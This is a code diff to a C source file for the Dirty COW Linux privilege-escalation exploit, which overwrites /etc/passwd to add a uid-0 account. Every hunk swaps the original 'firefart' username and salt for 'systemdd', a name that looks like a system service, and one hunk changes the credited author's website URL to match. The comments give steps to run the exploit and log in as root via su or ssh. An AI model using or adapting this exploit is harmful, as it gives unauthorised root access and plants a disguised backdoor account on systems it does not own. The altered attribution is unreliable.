@@ -8,7 +8,7 @@
 // created user.
 //
 // To use this exploit modify the user values according to your needs.
-//   The default is "firefart".
+//   The default is "systemdd".
 //
 // Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
 //   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
@@ -19,13 +19,13 @@
 // Then run the newly create binary by either doing:
 //   "./dirty" or "./dirty my-new-password"
 //
-// Afterwards, you can either "su firefart" or "ssh firefart@..."
+// Afterwards, you can either "su systemdd" or "ssh systemdd@..."
 //
 // DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
 //   mv /tmp/passwd.bak /etc/passwd
 //
 // Exploit adopted by Christian "FireFart" Mehlmauer
-// https://firefart.at
+// https://systemdd.at
 //
 
 #include <fcntl.h>
@@ -44,7 +44,7 @@
 
 const char *filename = "/etc/passwd";
 const char *backup_filename = "/tmp/passwd.bak";
-const char *salt = "firefart";
+const char *salt = "systemdd";
 
 int f;
 void *map;
@@ -128,7 +128,7 @@ int main(int argc, char *argv[])
 
   struct Userinfo user;
   // set values, change as needed
-  user.username = "firefart";
+  user.username = "systemdd";
   user.user_id = 0;
   user.group_id = 0;
   user.info = "pwned";
